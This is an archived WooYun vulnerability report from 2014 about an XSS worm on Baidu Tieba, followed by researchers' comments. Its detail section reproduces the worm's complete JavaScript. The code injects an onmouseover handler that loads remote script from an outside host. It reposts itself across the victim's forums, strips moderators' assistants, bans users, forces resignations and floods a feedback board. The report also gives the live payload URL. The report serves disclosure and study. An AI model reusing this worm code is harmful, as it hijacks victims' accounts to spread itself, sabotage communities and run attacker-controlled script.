{"id": 4633, "wybug_id": "wooyun-2014-053221", "wybug_title": "百度贴吧xss蠕虫20140309", "wybug_corp": "百度", "wybug_author": "熊猫", "wybug_date": "2014-03-09 19:04", "wybug_open_date": "2014-04-23 19:04", "wybug_type": "恶意信息传播", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["恶意信息传播", "钓鱼欺诈"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向公众公开  简要描述： 百度贴吧出现xss传播帖 详细说明：  \nvar n=PageData.user.user_forum_list.info.length;var num=0;\tvar config = { \t\ttitles: [\"\\u4f60\\u7684\\u672a\\u6765\\u5728\\u8fd9\\u4e2a\\u5e16\\u5b50\\u91cc\\uff0c\\u60f3\\u770b\\u5417\\uff1f\", \"\\u611a\\u8822\\u7684\\u51e1\\u4eba \\u63a5\\u53d7\\u795e\\u306e\\u6012\\u706b\\u5427\",\"\\u8fd9\\u662f\\u547d\\u8fd0\\u77f3\\u4e4b\\u95e8\\u7684\\u9009\\u62e9\",\"\\u98a4\\u6296\\u5427\\uff0c\\u51e1\\u4eba\\u4eec\\uff01\",\"\\u6b3a\\u9a97\\u4e00\\u5f00\\u59cb\\u7684\\u4f60 \\u6b3a\\u9a97\\u4e16\\u754c\\u5427\",\"\\u8c01\\u8981\\u5403\\u53d8\\u6001\\u7684\\u9999\\u8549\\uff01\",\"\\u521a\\u624d\\u6536\\u5230\\u4e86\\u5f3a\\u70c8\\u7684\\u7cbe\\u795e\\u653b\\u51fb \\u5fc3...\\u5fc3\\u7075\\u6b63\\u906d\\u5230\\u4fb5\\u8680\",\"\\u4e0d\\u8981\\u9760\\u8fd1\\u6211\\uff01\\u6211\\u6b63\\u5728\\u6267\\u884c\\u963b\\u6b62\\u673a\\u5173\\u66b4\\u529b\\u884c\\u4e3a\\u7684\\u4f5c\\u6218\",\"\\u624b\\u62ff\\u91d1\\u5777\\u5783\\uff0c\\u811a\\u8e0f\\u4e03\\u5f69\\u4e91\\u7aef\\uff0c\\u53d1\\u51fa\\u6700\\u540e\\u7684\\u5450\\u558a\",\"\\u98a4\\u6296\\u5427\\uff0c\\u51e1\\u4eba\\u4eec\\uff01\"],\t\tcontents: ['\"style=\"height:100%;width:100;position:fixed'],\t\ttbs: PageData.tbs,\t\twhiteList: [635137, 1074587, 116863],        evilContent: '\"onmouseover=\"$.getScript(\\u0027//baid.ws/c8tf\\u0027)' //xss\t};\tvar userInfo = {        is_red_tail:function(i){$.get('http://tieba.baidu.com/home/get/panel?ie=utf-8&un='+PageData.user.name,function(data){return data.data.identity});}(),\t\tis_bawu: function (p) {\t\t\treturn p.bawu ? p.can_edit_gconforum ? \"daba\" : \"xiaoba\" : \"none\"\t\t}(PageData.user.power)\t};\tfunction addGood(fid, kw, tid) {\t\t$.get('http://tieba.baidu.com/mo/q---9E2EBBE47D2160067823F56F5F549254%3AFG%3D1--1-3-0--2--wapp_1393073859357_21/m?tn=bdSGD&tbs=' + config.tbs + '&word=' + encodeURIComponent(kw) + '&z=' + tid + '&fid=' + fid + '&ntn=set&pn=0&cate=0&expand=0&pinf=1_2_0');\t}\tfunction topThread(fid, kw, tid) { \t\t$.get('http://tieba.baidu.com/mo/q---9E2EBBE47D2160067823F56F5F549254%3AFG%3D1--1-3-0--2--wapp_1393073859357_21/m?tn=bdTOP&z=' + tid + '&tbs=' + config.tbs + '&word=' + encodeURIComponent(kw) + '&expand=0&fid=' + fid + '&ntn=set&pinf=1_2_0');\t}\tfunction killXiaoBa() {\t\t$.get(\"/bawu2/platform/listBawuTeam?ie=utf-8&word=\" + encodeURIComponent(PageData.forum.name), function (x) {\t\t\t$(x).find(\"ul[id*='assist']\").find(\"li[data-field*='\\\"user_id\\\":']\").each(function () {\t\t\t\t$.post(\"/bawu2/platform/delBawuMember\", {\t\t\t\t\ttbs: config.tbs,\t\t\t\t\tword: PageData.forum.name,\t\t\t\t\tuser_id: $.parseJSON(this.dataset.field).user_id,\t\t\t\t\ttype: \"assist\",\t\t\t\t\tie: \"utf-8\"\t\t\t\t});\t\t\t});\t\t});\t}\tfunction banXiaoBa() {\t\t$.get('http://tieba.baidu.com/f/bawu/admin_group?ie=utf-8&kw=' + encodeURIComponent(PageData.forum.name) + '&fid=' + PageData.forum.id, function (res) {\t\t\t$(res).find('tr:nth-child(3)').find('a').each(function () {\t\t\t\t$.post('/bawu/cm', {\t\t\t\t\tcm: 'filter_forum_user',\t\t\t\t\tban_days: 1,\t\t\t\t\tuser_name: $(this).text(),\t\t\t\t\tword: PageData.forum.name,\t\t\t\t\tfid: PageData.forum.id,\t\t\t\t\ttbs: config.tbs,\t\t\t\t\tie: 'utf-8'\t\t\t\t})\t\t\t})\t\t})\t}\tfunction czDaba() {\t\t$.post('/bawu/cm', {\t\t\tcm: 'apply_resign',\t\t\tresignation: '\\u518d\\u89c1\\u4e86 \\u6211\\u7684\\u670b\\u53cb\\u4eec.',\t\t\tdtype: 'json',\t\t\tword: PageData.forum.name,\t\t\tfid: PageData.forum.id,\t\t\ttbs: config.tbs,\t\t\tie: 'utf-8'\t\t})\t}\tfunction addThread(fid) {\t\t$.post(\"/relay/commit\", {\t\t\tie: \"utf-8\",\t\t\tkw: \"test\",            fid:35,            tid:2910585163,\t\t\tftid: fid,            ptid:2910585163,            ppid:47102132189,\t\t\ttbs: PageData.tbs,\t\t\ttitle: config.titles[Math.random() * config.titles.length | 0],\t\t\tcontent: \"aeb1cb13495409230133f7cd9058d109b3de492f#\"+config.contents[Math.random() * config.contents.length | 0]+config.evilContent,new_vcode:1,tag:11,activity_id:1425,act_type:\"photo\",__type__:\"repost\"\t\t},function (x) {          if (x.no == 0 || x.new_thread_id) return x.new_thread_id;})\t}function reply(){  if (-1 !== config.whiteList.indexOf(PageData.user.user_forum_list.info[num].id) || !userInfo.is_red_tail && !PageData.user.user_forum_list.info[num].is_like){num++;return;}  if(PageData.user.user_forum_list.info[num].tid){   num++;  }else{    PageData.user.user_forum_list.info[num].tid=true;addThread(PageData.user.user_forum_list.info[num].id);  }}\tfunction fuckRedTail() {\t\tvar obj = {\t\t\tie: \"utf-8\",\t\t\tkw: \"\\u8d34\\u5427\\u610f\\u89c1\\u53cd\\u9988\",\t\t\tfid: 898666,\t\t\ttbs: PageData.tbs,\t\t\ttitle: \"\\u767e\\u5ea6SB\",\t\t\tcontent: config.contents[Math.random() * config.contents.length | 0]\t\t}\t\tfor(var i=0;i<100;i++){\t\t\t$.post(\"/f/commit/thread/add\",obj);\t\t}\t}\tif(userInfo.is_red_tail){setInterval(\"fuckRedTail()\",8000)}\tif (\"daba\" === userInfo.is_bawu){ killXiaoBa(); czDaba();}\tif (\"xiaoba\" === userInfo.is_bawu) banXiaoBa();var ruchong=setInterval(\"reply()\",2000);\n   漏洞证明：  newwordpress.duapp.com/xss20140309/rc1.js全贴吧http://tieba.baidu.com/p/2911107056\n\n   修复方案：  修复...   版权声明：转载请注明来源 熊猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-09 19:59 厂商回复： 感谢提交，已通知业务部门紧急修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-09 19:06 |    \t\tkylin \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我是包子)\t\t \n  表示好像是从test吧出来的...发贴记录上看7号就在测试着搞。。。下午六点左右发现已经传播的很快嘛~ 然后百度好像就开始删帖了，不过这个系统删帖可能是基于重复帖删的...不知道什么时候修复...js地址http://newwordpress.duapp.com/xss20140309/rc1.js  貌似看到有function killXiaoBa()    \n     2014-03-09 19:07 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  QwQ审核好棒~    \n     2014-03-09 19:15 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  这个利用代码放在duapp上的，直接把源头的app处理掉，然后再修复转贴的过滤问题。应该挺快的才对。    \n     2014-03-09 19:16 |    \t\tDraem Where \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 嗯哼~)\t\t \n  这个。。好厉害。。    \n     2014-03-09 19:16 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  我猜度娘会回复已从其他渠道得知，感谢反馈  然后1rank     \n     2014-03-09 19:19 |    \t\t清炒柚子 \t\t\t( 实习白帽子  |\t\t\t        Rank:69 漏洞数:9        | 功力不足，闭关修炼)\t\t \n  不明觉厉！    \n     2014-03-09 19:20 |    \t\t龙 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 龙哥盟飞龙)\t\t \n  顶一个。    \n     2014-03-09 19:27 |    \t\t雪糕 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 我是个屌丝。)\t\t \n  高大上    \n     2014-03-09 19:38 |    \t\t野驴~ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 充满强烈好奇心的菜鸟。)\t\t \n  看来熊猫要烧香了    \n     2014-03-09 19:44 |    \t\tPooke \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 菜鸟团撸过。)\t\t \n  速度处理啊、、、、再蔓延下去。。。人家把JS内容一换  不知道能干多少事了、、、、    \n     2014-03-09 20:03 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  求详情~~    \n     2014-03-09 20:04 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  熊猫 越来越吊啊！    \n     2014-03-09 20:25 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  熊猫 越来越吊啊！    \n     2014-03-09 20:26 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  @超威蓝猫 @mango  不是我...不是我...     \n     2014-03-09 20:55 |    \t\t小乔 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | nmsl,wsnd,hjyz.)\t\t \n  熊猫太吊了    \n     2014-03-10 18:23 |    \t\t龙 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 龙哥盟飞龙)\t\t \n  @gainover 其实如果bae能举报的话 咱们可以先把他那个app举报了    \n     2014-03-19 17:04 |    \t\tdun \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | I am dun.)\t\t \n  我自己举报不给通过-_-#    \n     2014-03-19 22:38 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  @dun 0 0厉害...没漏洞就有帐号了    \n     2014-03-20 19:36 |    \t\tdun \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | I am dun.)\t\t \n  @熊猫 一位神秘人给的→_→提交好几次存储xss，百度各种不买单。。。    \n     2014-04-23 20:18 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  终于公开了 看看怎么回事去    \n     2014-04-23 20:37 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @dun 神秘人 ..跪拜    \n     2015-04-26 01:07 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  我想知道脚本是怎么绕过百度贴吧的xss过滤给插进去的，你这里光贴出攻击脚本的本身有什么意义啊，又没说是怎么绕过xss防御的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}